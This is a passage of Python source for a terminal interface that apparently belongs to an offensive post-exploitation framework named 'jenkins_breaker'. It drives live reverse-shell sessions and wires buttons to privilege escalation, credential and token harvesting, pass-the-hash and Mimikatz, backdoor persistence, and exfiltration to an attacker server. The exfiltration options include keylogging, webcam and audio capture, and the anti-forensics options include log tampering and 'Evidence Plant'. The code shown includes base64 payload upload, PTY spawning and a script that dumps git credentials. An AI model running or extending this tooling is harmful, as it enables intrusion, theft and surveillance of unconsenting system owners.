                                yield Button("Terraform Variables", id="harv-terraform")
                                yield Button("Pulumi Secrets", id="harv-pulumi")

                        with TabPane("Lateral", id="tab-lateral"):
                            yield Label("Target Network:")
                            yield Input(placeholder="10.0.0.0/24", id="lateral-network-input", value="10.0.0.0/24")
                            with VerticalScroll():
                                yield Button("Network Discovery", id="lat-network-scan", variant="primary")
                                yield Button("Known Hosts Enum", id="lat-known-hosts")
                                yield Button("Active Sessions", id="lat-sessions")
                                yield Button("ARP Cache Scan", id="lat-arp-scan")
                                yield Button("Mount Point Enum", id="lat-mounts")
                                yield Button("SMB Discovery", id="lat-smb")
                                yield Button("RDP Enumeration", id="lat-rdp")
                                yield Button("Kerberos Ticket Reuse", id="lat-kerberos")
                                yield Button("SSH Key Reuse", id="lat-ssh-reuse")
                                yield Button("Pass-the-Hash", id="lat-pth")
                                yield Button("Token Impersonation", id="lat-token-imp")
                                yield Button("Mimikatz Integration", id="lat-mimikatz")
                                yield Button("Docker Network Scan", id="lat-docker-net")
                                yield Button("K8s Pod Pivoting", id="lat-k8s-pivot")
                                yield Button("Cloud IAM Assumption", id="lat-iam")
                                yield Button("Cross-Account AWS", id="lat-cross-aws")
                                yield Button("GCP Project Enum", id="lat-gcp-proj")
                                yield Button("Azure Subscription", id="lat-azure-sub")
                                yield Button("VPN Config Harvest", id="lat-vpn")
                                yield Button("Proxy Chain Setup", id="lat-proxy")

                        with TabPane("Persist", id="tab-persist"):
                            yield Label("Callback:")
                            yield Input(placeholder="attacker:port", id="persist-callback-input")
                            with VerticalScroll():
                                yield Button("Backdoor User", id="per-backdoor-user", variant="success")
                                yield Button("Cron Backdoor", id="per-cron")
                                yield Button("SSH Key Inject", id="per-ssh-key")
                                yield Button("Systemd Service", id="per-systemd")
                                yield Button("LD_PRELOAD Hook", id="per-ld-preload")
                                yield Button("PAM Backdoor", id="per-pam")
                                yield Button("Bashrc Injection", id="per-bashrc")
                                yield Button("Startup Scripts", id="per-startup")
                                yield Button("Registry Run Keys (Win)", id="per-registry")
                                yield Button("WMI Subscription (Win)", id="per-wmi")
                                yield Button("Scheduled Task Persist (Win)", id="per-schtask")
                                yield Button("Golden Ticket", id="per-golden")
                                yield Button("Silver Ticket", id="per-silver")
                                yield Button("Skeleton Key", id="per-skeleton")
                                yield Button("Jenkins Pipeline Backdoor", id="per-jenkins")
                                yield Button("Git Hook Backdoor", id="per-git")
                                yield Button("Docker Container Persist", id="per-docker")
                                yield Button("K8s Admission Webhook", id="per-k8s")
                                yield Button("Lambda Backdoor (AWS)", id="per-lambda")
                                yield Button("Cloud Function Persist (GCP)", id="per-gcf")

                        with TabPane("Situational", id="tab-situational"):
                            with VerticalScroll():
                                yield Button("EDR/AV Detection", id="sit-edr-detect", variant="primary")
                                yield Button("Firewall Rules", id="sit-firewall")
                                yield Button("SELinux/AppArmor", id="sit-selinux")
                                yield Button("Monitoring Processes", id="sit-monitoring")
                                yield Button("Active Connections", id="sit-connections")
                                yield Button("Logged Users", id="sit-users")
                                yield Button("Environment Context", id="sit-context")
                                yield Button("Network Interfaces", id="sit-netif")
                                yield Button("Routing Tables", id="sit-routes")
                                yield Button("DNS Servers", id="sit-dns")
                                yield Button("Proxy Detection", id="sit-proxy")
                                yield Button("NTP Servers", id="sit-ntp")
                                yield Button("Syslog Destination", id="sit-syslog")
                                yield Button("SIEM Detection", id="sit-siem")
                                yield Button("Container Runtime", id="sit-container")
                                yield Button("Orchestrator Detection", id="sit-orchestrator")
                                yield Button("Cloud Provider Detect", id="sit-cloud")
                                yield Button("Backup Software", id="sit-backup")
                                yield Button("AV Exclusions", id="sit-av-excl")
                                yield Button("Application Whitelisting", id="sit-appwhite")

                        with TabPane("Exfiltrate", id="tab-exfiltrate"):
                            yield Label("Output Server:")
                            yield Input(placeholder="http://attacker:8080", id="exfil-server-input")
                            with VerticalScroll():
                                yield Button("Memory Dump Process", id="exf-mem-dump", variant="primary")
                                yield Button("Token Stealer (K8s/Docker)", id="exf-tokens")
                                yield Button("Certificate Harvest", id="exf-certificates")
                                yield Button("Shadow File Extract", id="exf-shadow")
                                yield Button("Full Credential Dump", id="exf-full-dump")
                                yield Button("Browser History", id="exf-browser-hist")
                                yield Button("Clipboard Monitor", id="exf-clipboard")
                                yield Button("Keylogger", id="exf-keylog")
                                yield Button("Screenshot Capture", id="exf-screenshot")
                                yield Button("Webcam Capture", id="exf-webcam")
                                yield Button("Audio Recording", id="exf-audio")
                                yield Button("File Search", id="exf-filesearch")
                                yield Button("Database Dump", id="exf-dbdump")
                                yield Button("Source Code Exfil", id="exf-source")
                                yield Button("Email Archive", id="exf-email")
                                yield Button("Chat History", id="exf-chat")
                                yield Button("S3 Bucket Enum", id="exf-s3")
                                yield Button("GCP Storage", id="exf-gcp-storage")
                                yield Button("Azure Blob", id="exf-azure-blob")
                                yield Button("Secrets Manager Dump", id="exf-secrets")

                        with TabPane("Utility", id="tab-utility"):
                            yield Label("Script Path:")
                            yield Input(placeholder="/local/path/script.sh", id="util-script-path")
                            with VerticalScroll():
                                yield Button("Stabilize TTY", id="util-stabilize", variant="primary")
                                yield Button("Clear All Tracks", id="util-clear-tracks")
                                yield Button("Upload Custom Script", id="util-upload")
                                yield Button("Port Forward Setup", id="util-port-forward")
                                yield Button("SOCKS Proxy", id="util-socks")
                                yield Button("Chisel Tunnel", id="util-chisel")
                                yield Button("SSH Tunnel", id="util-ssh-tunnel")
                                yield Button("Reverse SSH", id="util-reverse-ssh")
                                yield Button("File Transfer", id="util-file-xfer")
                                yield Button("Packet Capture", id="util-pcap")
                                yield Button("Traffic Intercept", id="util-intercept")
                                yield Button("Process Injection", id="util-inject")
                                yield Button("Persistence Menu", id="util-persist-menu")
                                yield Button("Cleanup Tool", id="util-cleanup")
                                yield Button("Anti-Forensics", id="util-antiforensics")
                                yield Button("Log Tamper", id="util-logtamper")
                                yield Button("Timestamp Manipulation", id="util-timestamp")
                                yield Button("Evidence Plant", id="util-evidence")
                                yield Button("Report Generator", id="util-report")
                                yield Button("Screenshot Loop", id="util-screenshot-loop")
                            yield Label(f"Sessions: {len(session_manager.list_active_sessions())}")

            with Horizontal(id="shell-buttons"):
                yield Button("Background (Ctrl+Z)", variant="warning", id="background-btn")
                yield Button("Copy Last Output", variant="primary", id="copy-output-btn")
                yield Button("Save Transcript", variant="success", id="save-transcript-btn")
                yield Button("Kill Session", variant="error", id="kill-btn")

    def on_mount(self) -> None:
        print(f"[DEBUG] ShellInteraction.on_mount() called for session {self.session_id}", flush=True)
        session_manager.set_current_session(self.session_id)
        self.running = True

        print(f"[DEBUG] Opening transcript at: {self.transcript_path}", flush=True)
        self.transcript_file = open(self.transcript_path, 'a', encoding='utf-8')
        self._log_transcript(f"=== Session Resumed: {datetime.now().isoformat()} ===\n")

        print("[DEBUG] Querying shell-output RichLog widget", flush=True)
        output = self.query_one("#shell-output", RichLog)
        print(f"[DEBUG] Got output widget: {output}", flush=True)

        if self.session_meta and self.session_meta.connection:
            try:
                sock = self.session_meta.connection
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                if hasattr(socket, 'TCP_KEEPIDLE'):
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
                if hasattr(socket, 'TCP_KEEPINTVL'):
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                if hasattr(socket, 'TCP_KEEPCNT'):
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)
            except:
                pass

        output.write(f">>> Interacting with session {self.session_id}\n")
        output.write(f"Status: {self.session_meta.status.value} | History: ↑↓ | Multi-handler: ACTIVE | Keepalive: ON\n")
        output.write("Ready to receive commands. Shell output will appear below:\n")
        output.write("────────────────────────────────────────────────────────────\n")
        print("[DEBUG] Wrote initial messages to shell output", flush=True)
        print(f"[DEBUG] ShellInteraction mounted for session {self.session_id}", flush=True)

        self.ops_runner = OpsRunner(
            session_meta=self.session_meta,
            send_command_func=self._send_command,
            output_func=lambda msg: output.write(msg)
        )

        self.recv_thread = threading.Thread(target=self._receive_output, daemon=True, name=f"RecvThread-{self.session_id}")
        self.recv_thread.start()
        print("[DEBUG] Receive thread started", flush=True)

        # NOTE: Removed shell initialization commands - they break working shells
        # If shell works with ncat, it should work without these commands
        # Keep the connection simple like ncat does

        print("[DEBUG] Focusing input widget", flush=True)
        input_widget = self.query_one("#shell-command-input", Input)

        # Force text to be visible with high contrast
        from rich.style import Style
        input_widget.styles.color = "#ffffff"
        input_widget.styles.background = "#0000ff"

        # Try to set text style directly
        try:
            input_widget._value_style = Style(color="#ffffff", bgcolor="#0000ff", bold=True)
        except:
            pass

        input_widget.focus()
        print("[DEBUG] on_mount complete", flush=True)

    def _log_transcript(self, text: str):
        """Log to transcript file"""
        if self.transcript_file:
            try:
                self.transcript_file.write(text)
                self.transcript_file.flush()
            except:
                pass

    def _receive_output(self):
        """Background thread to receive shell output with robust error handling"""
        try:
            debug_log = open("C:/Users/Chogyam/tui_recv_debug.log", "a")
            debug_log.write(f"[DEBUG] _receive_output thread started for session {self.session_id}\n")
            debug_log.flush()
        except:
            debug_log = None

        if not self.session_meta or not self.session_meta.connection:
            self.app.call_from_thread(self._append_output, ">>> ERROR: No connection available\n")
            if debug_log:
                debug_log.write("[DEBUG] No connection available in _receive_output\n")
                debug_log.flush()
            return

        conn = self.session_meta.connection

        # Use blocking mode like ncat - no timeout for reading
        # This matches ncat's behavior exactly
        try:
            conn.setblocking(True)
            conn.settimeout(None)  # Blocking mode, no timeout
            if debug_log:
                debug_log.write("[DEBUG] Set socket to blocking mode (like ncat)\n")
                debug_log.flush()
        except Exception as e:
            if debug_log:
                debug_log.write(f"[DEBUG] Could not set blocking mode: {e}\n")
                debug_log.flush()

        consecutive_errors = 0
        max_errors = 5

        # DON'T call UI from here - can block thread startup
        # self.call_from_thread(self._append_output, ">>> Receive thread started...\n")

        if debug_log:
            debug_log.write("[DEBUG] Socket in blocking mode, entering receive loop (like ncat)\n")
            debug_log.flush()

        try:
            peer = conn.getpeername()
            if debug_log:
                debug_log.write(f"[DEBUG] Socket connected to: {peer}\n")
                debug_log.flush()
        except Exception as e:
            if debug_log:
                debug_log.write(f"[DEBUG] Could not get peer name: {e}\n")
                debug_log.flush()

        bytes_received_total = 0

        # Simple blocking receive loop - matches ncat behavior exactly
        while self.running:
            try:
                # Blocking recv - will wait for data like ncat does
                data = conn.recv(16384)
                if debug_log:
                    debug_log.write(f"[DEBUG] recv() returned {len(data) if data else 0} bytes\n")
                    debug_log.flush()

                if data:
                    bytes_received_total += len(data)
                    output_text = data.decode('utf-8', errors='replace')
                    if debug_log:
                        debug_log.write(f"[DEBUG] Decoded {len(data)} bytes: {repr(output_text[:100])}\n")
                        debug_log.write("[DEBUG] About to call _append_output via app.call_from_thread\n")
                        debug_log.flush()
                    self._log_transcript(output_text)
                    # Use app.call_from_thread instead of self.call_from_thread for ModalScreen compatibility
                    self.app.call_from_thread(self._append_output, output_text)
                    session_manager.heartbeat(self.session_id)
                    consecutive_errors = 0
                else:
                    # Empty recv means connection closed
                    if debug_log:
                        debug_log.write("[DEBUG] Connection closed by remote\n")
                        debug_log.flush()
                    self.app.call_from_thread(self._append_output, "\n>>> Session terminated (remote closed)\n")
                    session_manager.mark_session_dead(self.session_id)
                    self.running = False
                    break

            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError) as e:
                print(f"[DEBUG] Connection error: {type(e).__name__}", flush=True)
                self.app.call_from_thread(self._append_output, f"\n>>> Connection lost: {type(e).__name__}\n")
                session_manager.mark_session_dead(self.session_id)
                self.running = False
                break

            except OSError as e:
                print(f"[DEBUG] OSError: {e}", flush=True)
                consecutive_errors += 1
                if consecutive_errors >= max_errors:
                    self.app.call_from_thread(self._append_output, f"\n>>> Socket error: {e}\n")
                    session_manager.mark_session_dead(self.session_id)
                    self.running = False
                    break

            except Exception as e:
                print(f"[DEBUG] Unexpected error: {type(e).__name__}: {e}", flush=True)
                import traceback
                traceback.print_exc()
                consecutive_errors += 1
                if consecutive_errors >= max_errors:
                    self.app.call_from_thread(self._append_output, f"\n>>> Fatal error: {str(e)}\n")
                    session_manager.mark_session_dead(self.session_id)
                    self.running = False
                    break

        print(f"[DEBUG] _receive_output thread exiting, total bytes received: {bytes_received_total}", flush=True)

    def _append_output(self, text: str):
        """Append raw text to output - markup disabled for compatibility"""
        try:
            debug_log = open("C:/Users/Chogyam/tui_append_debug.log", "a")
            debug_log.write(f"[DEBUG] _append_output called with {len(text)} bytes: {repr(text[:50])}\n")
            debug_log.flush()
        except:
            debug_log = None

        try:
            output = self.query_one("#shell-output", RichLog)
            if debug_log:
                debug_log.write("[DEBUG] Got RichLog widget, calling write()\n")
                debug_log.flush()
            output.write(text)
            if debug_log:
                debug_log.write("[DEBUG] Successfully wrote to RichLog\n")
                debug_log.flush()
        except Exception as e:
            if debug_log:
                debug_log.write(f"[DEBUG] ERROR in _append_output: {type(e).__name__}: {e}\n")
                debug_log.flush()
            import traceback
            traceback.print_exc()

    def _send_command(self, command: str, show_in_output: bool = True):
        """Send command to shell with robust error handling"""
        print(f"[DEBUG] _send_command called with: {repr(command)}, show_in_output={show_in_output}", flush=True)

        if show_in_output:
            try:
                output = self.query_one("#shell-output", RichLog)
                # Write plain text command prompt
                output.write(f"$ {command}\n")
                print(f"[DEBUG] Echoed command to output: {command}", flush=True)
            except Exception as e:
                print(f"[DEBUG] Failed to echo command: {e}", flush=True)

        self._log_transcript(f"$ {command}\n")

        if not self.session_meta or not self.session_meta.connection:
            if show_in_output:
                output = self.query_one("#shell-output", RichLog)
                output.write(">>> Session disconnected\n")
            print("[DEBUG] No connection in _send_command", flush=True)
            return False

        retry_count = 0
        max_retries = 3

        while retry_count < max_retries:
            try:
                cmd_bytes = (command + "\n").encode('utf-8')
                self.session_meta.connection.sendall(cmd_bytes)
                session_manager.heartbeat(self.session_id)
                print(f"[DEBUG] Successfully sent {len(cmd_bytes)} bytes to socket", flush=True)
                return True
            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
                if show_in_output:
                    output = self.query_one("#shell-output", RichLog)
                    output.write(">>> Connection lost\n")
                session_manager.mark_session_dead(self.session_id)
                print("[DEBUG] Connection lost in _send_command", flush=True)
                return False
            except BlockingIOError:
                retry_count += 1
                import time
                time.sleep(0.1)
                continue
            except Exception as e:
                if show_in_output:
                    output = self.query_one("#shell-output", RichLog)
                    output.write(f">>> Send error: {str(e)}\n")
                session_manager.mark_session_dead(self.session_id)
                print(f"[DEBUG] Send error: {e}", flush=True)
                return False

        if show_in_output:
            output = self.query_one("#shell-output", RichLog)
            output.write(">>> Send timeout (socket busy)\n")
        print("[DEBUG] Send timeout", flush=True)
        return False

    def on_input_submitted(self, event: Input.Submitted) -> None:
        print(f"[DEBUG] on_input_submitted triggered, input.id={event.input.id}, value={repr(event.value)}", flush=True)

        if event.input.id == "shell-command-input":
            command = event.value.strip()
            print(f"[DEBUG] Command stripped: {repr(command)}", flush=True)

            if not command:
                print("[DEBUG] Empty command, ignoring", flush=True)
                return

            self.command_history.append(command)
            self.history_index = len(self.command_history)
            print(f"[DEBUG] Added to history, now have {len(self.command_history)} commands", flush=True)

            print("[DEBUG] Calling _send_command", flush=True)
            self._send_command(command)
            print("[DEBUG] Clearing input", flush=True)
            event.input.value = ""
            print("[DEBUG] on_input_submitted complete", flush=True)

    def on_key(self, event) -> None:
        """Handle arrow keys for command history and tab for completion"""
        input_widget = self.query_one("#shell-command-input", Input)

        if event.key == "up" and self.command_history:
            self.history_index = max(0, self.history_index - 1)
            input_widget.value = self.command_history[self.history_index]
            event.prevent_default()
        elif event.key == "down" and self.command_history:
            self.history_index = min(len(self.command_history), self.history_index + 1)
            if self.history_index < len(self.command_history):
                input_widget.value = self.command_history[self.history_index]
            else:
                input_widget.value = ""
            event.prevent_default()

    def _stabilize_shell(self):
        """Auto-stabilize shell using PTY spawn"""
        output = self.query_one("#shell-output", RichLog)
        output.write("\n>>> Attempting shell stabilization...\n")
        print("[DEBUG] Starting shell stabilization")

        stabilization_commands = [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "script -qc /bin/bash /dev/null",
        ]

        for cmd in stabilization_commands:
            if self._send_command(cmd, show_in_output=False):
                import time
                time.sleep(0.5)
                break

        self._send_command("export TERM=xterm", show_in_output=False)
        self._send_command("export SHELL=/bin/bash", show_in_output=False)
        self._send_command("stty rows 38 columns 140", show_in_output=False)

        self.is_stabilized = True
        output.write("✓ Shell stabilized! (PTY spawned, TERM set)\n")
        print("[DEBUG] Shell stabilization complete")

        try:
            stabilize_btn = self.query_one("#util-stabilize", Button)
            stabilize_btn.label = "✓ Stabilized"
            stabilize_btn.disabled = True
        except:
            pass

    def _upload_file_b64(self, local_path: str, remote_path: str):
        """Upload file via base64 encoding"""
        output = self.query_one("#shell-output", RichLog)

        try:
            with open(local_path, 'rb') as f:
                file_data = f.read()

            encoded = base64.b64encode(file_data).decode('ascii')

            output.write(f"\n[cyan]>>> Uploading {local_path} to {remote_path}...[/cyan]")

            self._send_command(f"echo '{encoded}' | base64 -d > {remote_path}", show_in_output=False)
            self._send_command(f"chmod +x {remote_path}", show_in_output=False)

            output.write(f"[green]✓ Upload complete: {len(file_data)} bytes[/green]\n")

        except Exception as e:
            output.write(f"[red]Upload failed: {str(e)}[/red]\n")

    def on_button_pressed(self, event: Button.Pressed) -> None:
        output = self.query_one("#shell-output", RichLog)
        btn_id = event.button.id

        if btn_id == "esc-kernel":
            from jenkins_breaker.ui.ops_scripts.escalate import KernelExploitSuggester
            self.ops_runner.run_python_script(KernelExploitSuggester)

        elif btn_id == "esc-capabilities":
            from jenkins_breaker.ui.ops_scripts.escalate import CapabilitiesEnum
            self.ops_runner.run_python_script(CapabilitiesEnum)

        elif btn_id == "esc-suid":
            from jenkins_breaker.ui.ops_scripts.escalate import SuidFinder
            self.ops_runner.run_python_script(SuidFinder)

        elif btn_id == "esc-path-hijack":
            from jenkins_breaker.ui.ops_scripts.escalate import PathHijack
            self.ops_runner.run_python_script(PathHijack)

        elif btn_id == "esc-docker-escape":
            from jenkins_breaker.ui.ops_scripts.escalate import DockerSocketEscape
            self.ops_runner.run_python_script(DockerSocketEscape)

        elif btn_id == "esc-container-break":
            from jenkins_breaker.ui.ops_scripts.escalate import ContainerBreakout
            self.ops_runner.run_python_script(ContainerBreakout)

        elif btn_id == "esc-sudo-exploit":
            from jenkins_breaker.ui.ops_scripts.escalate import SudoVersionCheck
            self.ops_runner.run_python_script(SudoVersionCheck)

        elif btn_id == "esc-cron":
            from jenkins_breaker.ui.ops_scripts.escalate import CronAnalysis
            self.ops_runner.run_python_script(CronAnalysis)

        elif btn_id == "esc-systemd":
            from jenkins_breaker.ui.ops_scripts.escalate import SystemdUnits
            self.ops_runner.run_python_script(SystemdUnits)

        elif btn_id == "esc-dbus":
            from jenkins_breaker.ui.ops_scripts.escalate import DBusEnum
            self.ops_runner.run_python_script(DBusEnum)

        elif btn_id == "esc-policykit":
            from jenkins_breaker.ui.ops_scripts.escalate import PolicyKitBypass
            self.ops_runner.run_python_script(PolicyKitBypass)

        elif btn_id == "esc-ld-preload":
            from jenkins_breaker.ui.ops_scripts.escalate import LDPreloadCheck
            self.ops_runner.run_python_script(LDPreloadCheck)

        elif btn_id == "esc-dirtycow":
            from jenkins_breaker.ui.ops_scripts.escalate import DirtyCowCheck
            self.ops_runner.run_python_script(DirtyCowCheck)

        elif btn_id == "esc-kernel-cve":
            from jenkins_breaker.ui.ops_scripts.escalate import KernelCVEMapper
            self.ops_runner.run_python_script(KernelCVEMapper)

        elif btn_id == "esc-uac":
            from jenkins_breaker.ui.ops_scripts.escalate import UACBypassWin
            self.ops_runner.run_python_script(UACBypassWin)

        elif btn_id == "esc-token":
            from jenkins_breaker.ui.ops_scripts.escalate import TokenManipulation
            self.ops_runner.run_python_script(TokenManipulation)

        elif btn_id == "esc-kerberos":
            from jenkins_breaker.ui.ops_scripts.escalate import KerberosTickets
            self.ops_runner.run_python_script(KerberosTickets)

        elif btn_id == "esc-sam":
            from jenkins_breaker.ui.ops_scripts.escalate import SAMSystemGrab
            self.ops_runner.run_python_script(SAMSystemGrab)

        elif btn_id == "esc-runas":
            from jenkins_breaker.ui.ops_scripts.escalate import RunAsCreds
            self.ops_runner.run_python_script(RunAsCreds)

        elif btn_id == "esc-schtask":
            from jenkins_breaker.ui.ops_scripts.escalate import ScheduledTaskHijack
            self.ops_runner.run_python_script(ScheduledTaskHijack)

        elif btn_id == "esc-weak-svc":
            from jenkins_breaker.ui.ops_scripts.escalate import WeakServicePermissions
            self.ops_runner.run_python_script(WeakServicePermissions)

        elif btn_id == "esc-unquoted":
            from jenkins_breaker.ui.ops_scripts.escalate import UnquotedServicePaths
            self.ops_runner.run_python_script(UnquotedServicePaths)

        elif btn_id == "esc-alwaysinstall":
            from jenkins_breaker.ui.ops_scripts.escalate import AlwaysInstallElevated
            self.ops_runner.run_python_script(AlwaysInstallElevated)

        elif btn_id == "esc-dll":
            from jenkins_breaker.ui.ops_scripts.escalate import DLLHijacking
            self.ops_runner.run_python_script(DLLHijacking)

        elif btn_id == "esc-sys32":
            from jenkins_breaker.ui.ops_scripts.escalate import WritableSystem32
            self.ops_runner.run_python_script(WritableSystem32)

        elif btn_id == "harv-ssh-keys":
            from jenkins_breaker.ui.ops_scripts.harvest import SSHKeyCollector
            self.ops_runner.run_python_script(SSHKeyCollector)

        elif btn_id == "harv-db-creds":
            from jenkins_breaker.ui.ops_scripts.harvest import DatabaseCreds
            self.ops_runner.run_python_script(DatabaseCreds)

        elif btn_id == "harv-cloud-meta":
            from jenkins_breaker.ui.ops_scripts.harvest import CloudMetadata
            self.ops_runner.run_python_script(CloudMetadata)

        elif btn_id == "harv-jenkins-secrets":
            from jenkins_breaker.ui.ops_scripts.harvest import JenkinsSecrets
            self.ops_runner.run_python_script(JenkinsSecrets)

        elif btn_id == "harv-git-repos":
            script = """
echo "[*] GIT REPOSITORY SCANNER"
echo "========================="
echo "[+] Searching for .git directories..."
find / -type d -name ".git" 2>/dev/null
echo ""
echo "[+] Extracting git credentials..."
find / -name ".git-credentials" 2>/dev/null -exec cat {} \\;
echo ""
echo "[+] Git config files:"
find / -name ".gitconfig" 2>/dev/null -exec grep -H "url\\|email\\|name" {} \\;
"""
            self.ops_runner.run_script(script, "git_scan.sh")

        elif btn_id == "harv-configs":
            from jenkins_breaker.ui.ops_scripts.harvest import ConfigScraper
            self.ops_runner.run_python_script(ConfigScraper)

        elif btn_id == "harv-browser":
            from jenkins_breaker.ui.ops_scripts.harvest import BrowserCreds
            self.ops_runner.run_python_script(BrowserCreds)

        elif btn_id == "harv-aws":
            from jenkins_breaker.ui.ops_scripts.harvest import AWSCreds
            self.ops_runner.run_python_script(AWSCreds)

        elif btn_id == "harv-keepass":
            from jenkins_breaker.ui.ops_scripts.harvest import KeePassFinder
            self.ops_runner.run_python_script(KeePassFinder)

        elif btn_id == "harv-aws-comp":
            from jenkins_breaker.ui.ops_scripts.harvest import AWSCredsComprehensive
            self.ops_runner.run_python_script(AWSCredsComprehensive)

        elif btn_id == "harv-gcp-sa":
            from jenkins_breaker.ui.ops_scripts.harvest import GCPServiceAccounts
            self.ops_runner.run_python_script(GCPServiceAccounts)

        elif btn_id == "harv-azure-mi":
            from jenkins_breaker.ui.ops_scripts.harvest import AzureManagedIdentity
            self.ops_runner.run_python_script(AzureManagedIdentity)

        elif btn_id == "harv-k8s":
            from jenkins_breaker.ui.ops_scripts.harvest import KubernetesTokens
            self.ops_runner.run_python_script(KubernetesTokens)

        elif btn_id == "harv-docker-reg":
            from jenkins_breaker.ui.ops_scripts.harvest import DockerRegistryCreds
            self.ops_runner.run_python_script(DockerRegistryCreds)

        elif btn_id == "harv-npm":
            from jenkins_breaker.ui.ops_scripts.harvest import NPMTokens
            self.ops_runner.run_python_script(NPMTokens)

        elif btn_id == "harv-pypi":
            from jenkins_breaker.ui.ops_scripts.harvest import PyPITokens
            self.ops_runner.run_python_script(PyPITokens)

        elif btn_id == "harv-github":
            from jenkins_breaker.ui.ops_scripts.harvest import GitHubTokens
            self.ops_runner.run_python_script(GitHubTokens)

        elif btn_id == "harv-gitlab":
            from jenkins_breaker.ui.ops_scripts.harvest import GitLabTokens
            self.ops_runner.run_python_script(GitLabTokens)

        elif btn_id == "harv-slack":
            from jenkins_breaker.ui.ops_scripts.harvest import SlackTokens
            self.ops_runner.run_python_script(SlackTokens)

        elif btn_id == "harv-sendgrid":
            from jenkins_breaker.ui.ops_scripts.harvest import SendGridKeys
            self.ops_runner.run_python_script(SendGridKeys)

        elif btn_id == "harv-twilio":
            from jenkins_breaker.ui.ops_scripts.harvest import TwilioCreds
            self.ops_runner.run_python_script(TwilioCreds)

        elif btn_id == "harv-datadog":
            from jenkins_breaker.ui.ops_scripts.harvest import DatadogKeys
            self.ops_runner.run_python_script(DatadogKeys)

        elif btn_id == "harv-stripe":
            from jenkins_breaker.ui.ops_scripts.harvest import StripeKeys
            self.ops_runner.run_python_script(StripeKeys)

        elif btn_id == "harv-postgres":
            from jenkins_breaker.ui.ops_scripts.harvest import PostgreSQLDump
            self.ops_runner.run_python_script(PostgreSQLDump)

        elif btn_id == "harv-mysql":
            from jenkins_breaker.ui.ops_scripts.harvest import MySQLDump
            self.ops_runner.run_python_script(MySQLDump)

        elif btn_id == "harv-mongodb":
            from jenkins_breaker.ui.ops_scripts.harvest import MongoDBDump
            self.ops_runner.run_python_script(MongoDBDump)

        elif btn_id == "harv-redis":
            from jenkins_breaker.ui.ops_scripts.harvest import RedisDump
            self.ops_runner.run_python_script(RedisDump)

        elif btn_id == "harv-vault":
            from jenkins_breaker.ui.ops_scripts.harvest import VaultTokens
            self.ops_runner.run_python_script(VaultTokens)

        elif btn_id == "harv-ansible":
            from jenkins_breaker.ui.ops_scripts.harvest import AnsibleVaults
            self.ops_runner.run_python_script(AnsibleVaults)

        elif btn_id == "harv-terraform":
            from jenkins_breaker.ui.ops_scripts.harvest import TerraformVars
            self.ops_runner.run_python_script(TerraformVars)

        elif btn_id == "harv-pulumi":
            from jenkins_breaker.ui.ops_scripts.harvest import PulumiSecrets
            self.ops_runner.run_python_script(PulumiSecrets)

        elif btn_id == "lat-network-scan":
            from jenkins_breaker.ui.ops_scripts.lateral import NetworkDiscovery
            self.ops_runner.run_python_script(NetworkDiscovery)

        elif btn_id == "lat-known-hosts":
            from jenkins_breaker.ui.ops_scripts.lateral import KnownHostsEnum
            self.ops_runner.run_python_script(KnownHostsEnum)

        elif btn_id == "lat-sessions":
            from jenkins_breaker.ui.ops_scripts.lateral import ActiveSessions
            self.ops_runner.run_python_script(ActiveSessions)

        elif btn_id == "lat-arp-scan":
            from jenkins_breaker.ui.ops_scripts.lateral import ARPScan
            self.ops_runner.run_python_script(ARPScan)

        elif btn_id == "lat-mounts":
            from jenkins_breaker.ui.ops_scripts.lateral import MountEnum
            self.ops_runner.run_python_script(MountEnum)

        elif btn_id == "lat-smb":
            from jenkins_breaker.ui.ops_scripts.lateral import SMBDiscovery
            self.ops_runner.run_python_script(SMBDiscovery)

        elif btn_id == "lat-rdp":
            from jenkins_breaker.ui.ops_scripts.lateral import RDPEnum
            self.ops_runner.run_python_script(RDPEnum)

        elif btn_id == "lat-kerberos":
            from jenkins_breaker.ui.ops_scripts.lateral import KerberosReuse
            self.ops_runner.run_python_script(KerberosReuse)

        elif btn_id == "lat-ssh-reuse":
            from jenkins_breaker.ui.ops_scripts.lateral import SSHKeyReuse
            self.ops_runner.run_python_script(SSHKeyReuse)

        elif btn_id == "lat-pth":
            from jenkins_breaker.ui.ops_scripts.lateral import PassTheHash
            self.ops_runner.run_python_script(PassTheHash)

        elif btn_id == "lat-token-imp":
            from jenkins_breaker.ui.ops_scripts.lateral import TokenImpersonation
            self.ops_runner.run_python_script(TokenImpersonation)

        elif btn_id == "lat-mimikatz":
            from jenkins_breaker.ui.ops_scripts.lateral import MimikatzIntegration
            self.ops_runner.run_python_script(MimikatzIntegration)

        elif btn_id == "lat-docker-net":
            from jenkins_breaker.ui.ops_scripts.lateral import DockerNetworkScan
            self.ops_runner.run_python_script(DockerNetworkScan)

        elif btn_id == "lat-k8s-pivot":
            from jenkins_breaker.ui.ops_scripts.lateral import K8sPodPivoting
            self.ops_runner.run_python_script(K8sPodPivoting)

        elif btn_id == "lat-iam":
            from jenkins_breaker.ui.ops_scripts.lateral import CloudIAMAssumption
            self.ops_runner.run_python_script(CloudIAMAssumption)

        elif btn_id == "lat-cross-aws":
            from jenkins_breaker.ui.ops_scripts.lateral import CrossAccountAWS
            self.ops_runner.run_python_script(CrossAccountAWS)

        elif btn_id == "lat-gcp-proj":
            from jenkins_breaker.ui.ops_scripts.lateral import GCPProjectEnum
            self.ops_runner.run_python_script(GCPProjectEnum)

        elif btn_id == "lat-azure-sub":
            from jenkins_breaker.ui.ops_scripts.lateral import AzureSubscription
            self.ops_runner.run_python_script(AzureSubscription)

        elif btn_id == "lat-vpn":
            from jenkins_breaker.ui.ops_scripts.lateral import VPNConfigHarvest
            self.ops_runner.run_python_script(VPNConfigHarvest)

        elif btn_id == "lat-proxy":
            from jenkins_breaker.ui.ops_scripts.lateral import ProxyChainSetup
            self.ops_runner.run_python_script(ProxyChainSetup)

        elif btn_id == "per-backdoor-user":
            from jenkins_breaker.ui.ops_scripts.persist import BackdoorUser
            self.ops_runner.run_python_script(BackdoorUser)

        elif btn_id == "per-cron":
            from jenkins_breaker.ui.ops_scripts.persist import CronBackdoor
            self.ops_runner.run_python_script(CronBackdoor)

        elif btn_id == "per-ssh-key":
